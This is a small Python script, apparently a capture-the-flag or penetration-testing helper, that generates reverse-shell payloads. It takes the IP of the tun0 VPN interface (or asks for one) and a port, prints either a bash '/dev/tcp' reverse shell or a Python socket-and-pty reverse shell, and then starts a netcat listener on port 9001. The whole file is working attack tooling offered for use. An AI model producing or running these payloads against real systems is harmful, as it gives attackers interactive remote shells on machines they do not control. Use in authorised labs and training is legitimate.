import netifaces
import sys
import os

if len(sys.argv) == 3:
    ip = sys.argv[1]
    port = sys.argv[2]
elif len(sys.argv) == 2:
    port = sys.argv[1]
else:
    ip,port = "127.0.0.1", "9001"

bash_shell = f"bash -i >& /dev/tcp/IP/PORT"
python_shell = f"python3 -c 'import os,pty,socket;s=socket.socket();s.connect((\"IP\",PORT));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn(\"bash\")'"


interfaces = netifaces.interfaces() # get list of network interfaces and grab the ip
if "tun0" in interfaces:
    vpn = True
    addresses = netifaces.ifaddresses("tun0")[2]
    addresses = str(addresses).split('\'')
    ip = addresses[3]
        #print(ip)
else: 
    ip = input("What IP would you like to use in your revshell?\n")
choice = int(input("What revshell do you want?\n[1] Bash revshell\n[2] Python revshell\n"))
if choice == 1:
    bash_shell = bash_shell.replace('IP',ip)
    bash_shell = bash_shell.replace('PORT',port)
    print(bash_shell)
elif choice == 2:
    python_shell = python_shell.replace('IP',ip)
    python_shell = python_shell.replace('PORT',port)
    print(python_shell)
os.system("nc -lvnp 9001")
    
